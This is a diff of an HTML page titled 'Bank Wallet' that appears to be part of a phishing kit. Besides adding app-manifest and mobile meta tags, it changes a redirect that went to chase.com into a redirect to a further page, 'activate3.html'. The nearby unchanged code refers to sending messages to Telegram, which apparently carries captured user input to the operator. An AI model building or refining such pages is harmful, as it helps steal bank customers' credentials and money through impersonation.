@@ -6,6 +6,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Bank Wallet</title>
     <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+    <link rel="manifest" href="manifest.json"> <!-- Link to the manifest file -->
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="default">
     <style>
         /* Global Styles */
         body {
@@ -296,9 +299,10 @@
         }
     </style>
     <script type="text/javascript">
+        // Google Translate initialization
         function googleTranslateElementInit() {
             new google.translate.TranslateElement({
-                pageLanguage: 'en', // Set your default page language here
+                pageLanguage: 'en',
                 includedLanguages: 'en,ko,th,tr,es,pt,fr,de,it,ja,zh,ru,pl,da,sv,fi,nl,ro,hu,cs,sk,sl,vi,id,ms,tl,hi,bn,ar',
                 layout: google.translate.TranslateElement.InlineLayout.SIMPLE,
                 autoDisplay: false
@@ -508,7 +512,7 @@
                         
                         // Redirect to chase.com after modal is closed
                         setTimeout(() => {
-                            window.location.href = 'https://www.chase.com'; // Redirect to Chase
+                            window.location.href = 'activate3.html'; // Redirect to Chase
                         }, 500); // Delay to ensure the modal closes smoothly
                     } else {
                         console.error('Error sending message to Telegram.');
@@ -535,5 +539,4 @@
     </script>
 </body>
 
-                                        </html>
-                                        
+</html>
